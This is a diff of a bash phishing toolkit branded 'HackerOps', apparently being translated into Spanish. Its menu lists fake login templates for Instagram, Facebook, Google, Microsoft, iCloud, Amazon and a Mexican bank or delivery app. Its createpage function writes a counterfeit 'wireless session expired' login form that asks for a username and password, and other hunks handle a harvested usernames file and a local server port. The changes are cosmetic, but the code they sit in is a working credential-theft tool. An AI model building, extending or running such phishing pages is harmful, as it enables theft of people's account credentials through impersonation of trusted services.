@@ -19,7 +19,7 @@ menu() {
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m Origin\e[0m          \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Gitlab\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m           \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Pinterest\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo\e[0m           \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;31m THD RH\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;93m Banregio\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;93m Rappi\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m      \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;93m iCloud\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m       \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;93m Amazon\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m       \e[1;92m[\e[0m\e[1;77m98\e[0m\e[1;92m]\e[0m\e[1;93m Personalizar\e[0m\n"
@@ -158,31 +158,31 @@ printf "\e[1;77m ██████╔╝███████║██║██
 printf "\e[1;77m ██╔═══╝ ██╔══██║██║╚════██║██╔══██║    ██║   ██║██╔═══╝ ╚════██║\e[0m\n"
 printf "\e[1;77m ██║     ██║  ██║██║███████║██║  ██║    ╚██████╔╝██║     ███████║\e[0m\n"
 printf "\e[1;77m ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝ ╚═╝     ╚══════╝\e[0m\n"
-printf "\e[1;77mv1.0 by HackerOps\e[0m\n"
+printf "\e[1;77mv1.0 by \e[96mHackerOps\e[0m\n"
 printf "\e[101m\e[0;77m::HackerOps recomienda el uso responsable de la herramienta::\e[0m\n"
 printf "\n"
 }
 
 createpage() {
-default_cap1="Wi-fi Session Expired"
-default_cap2="Please login again."
+default_cap1="Conexion Inalambrica Expirada"
+default_cap2="Inicia sesion nuevamente."
 default_user_text="Username:"
 default_pass_text="Password:"
-default_sub_text="Log-In"
+default_sub_text="iniciar sesion"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expirada): \e[0m' cap1
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Titulo 1 (Default: Wi-fi Session Expirada): \e[0m' cap1
 cap1="${cap1:-${default_cap1}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Por favor vuelva a iniciar sesión.): \e[0m' cap2
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Titulo 2 (Default: Por favor vuelva a iniciar sesión.): \e[0m' cap2
 cap2="${cap2:-${default_cap2}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Campo Username (Default: Username:): \e[0m' user_text
 user_text="${user_text:-${default_user_text}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Campo Password (Default: Password:): \e[0m' pass_text
 pass_text="${pass_text:-${default_pass_text}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Boton de Inicio de sesion (Default: Log-In): \e[0m' sub_text
 sub_text="${sub_text:-${default_sub_text}}"
 
 echo "<!DOCTYPE html>" > sites/create/login.html
@@ -339,7 +339,7 @@ rm -rf sites/$server/usernames.txt
 fi
 
 default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
-printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Elige un Puerto (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
+printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Elige un Puerto (Default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_port
 read port
 port="${port:-${default_port}}"
 serverx
